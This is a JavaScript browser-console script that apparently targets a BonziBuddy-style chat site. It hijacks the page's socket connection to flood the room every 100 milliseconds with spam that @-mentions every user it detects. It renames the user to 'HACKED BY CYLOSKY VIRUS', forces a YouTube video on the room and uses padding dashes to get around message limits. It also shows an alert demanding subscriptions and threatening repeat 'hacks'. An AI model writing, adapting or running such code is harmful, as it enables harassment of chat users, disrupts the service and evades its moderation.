(() => {
  // Import BonziData structure from bonzi.gay
  const BonziData = {
    colors: ["black", "blue", "brown", "cyan", "green", "pink", "purple", "red", "white", "yellow", "blessed", "noob", "glow", "pope"],
    hats: ["bear", "bfdi", "bieber", "bowtie", "bucket", "chain", "cigar", "dank", "elon", "evil", "horse", "illuminati", "kamala", "king", "maga", "obama", "pot", "propeller", "tophat", "troll", "truck", "witch", "wizard"]
  };
  
  // Random selection helpers
  function randomColor() {
    return BonziData.colors[Math.floor(Math.random() * BonziData.colors.length)];
  }
  
  function randomHat() {
    return BonziData.hats[Math.floor(Math.random() * BonziData.hats.length)];
  }
  
  // Trigger the YouTube video (using existing socket from bonzi.gay)
  socket.emit('command', {
    list: ['youtube', '8VWjG8PwPLw']
  });
  
  alert('congratulations, you got hacked, now your punishment is to SUB TO LOSKYTHECOPYDOG77 AND CYANPIXAR NOOOOOOW! if you dont, or block losky and Cyanpixar, or report both, you will get hacked again!'); 
  
  // Store detected usernames
  let detectedUsers = new Set();
  let dashCount = 0;
  let colorChangeCount = 0;
  
  // Listen for room updates to detect usernames
  socket.on('room', (data) => {
    if (data && data.users) {
      Object.keys(data.users).forEach(userId => {
        const user = data.users[userId];
        if (user && user.name && user.name !== 'HACKED BY CYLOSKY VIRUS') {
          detectedUsers.add(user.name);
          console.log('Detected user:', user.name);
        }
      });
    }
  });
  
  // Flood with bypass and BonziData integration
  setInterval(function(){
    document.title = 'SUB TO LOSKYTHECOPYDOG77 AND CYANPIXAR NOW!!';
    document.getElementById('content').style.backgroundImage = 'url(https://cdn.discordapp.com/attachments/488233448700379156/648277281348780033/download_3.jpeg)';
    socket.emit('command',{list:['name','HACKED BY CYLOSKY VIRUS']});
    document.getElementById('content').style.backgroundRepeat = 'repeat';
    
    // Rapidly cycle through colors and hats for maximum chaos
    colorChangeCount++;
    if (colorChangeCount % 2 === 0) {
      socket.emit('command', {list: ['color', randomColor()]});
      socket.emit('command', {list: ['hat', randomHat()]});
    }
    
    // Add bypass dashes to avoid message limit
    const bypass = '-'.repeat(dashCount % 10);
    let floodMessage = 'CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYANPIXAR LOSKY ' + bypass;
    
    // If users detected, add them to the flood message
    if (detectedUsers.size > 0) {
      const userList = Array.from(detectedUsers).join(' @');
      floodMessage = `@${userList} ` + floodMessage;
    }
    
    socket.emit('talk',{text: floodMessage});
    dashCount++;
  }, 100);
  
  console.log("🔥 CYLOSKY HACK ACTIVATED 🔥");
  console.log("✓ BonziData integration: ENABLED");
  console.log("✓ Message bypass: ENABLED");
  console.log("✓ User detection: ENABLED");
  console.log("✓ Color/Hat randomization: ENABLED");
  console.log("Ready to flood with maximum chaos!");
})();
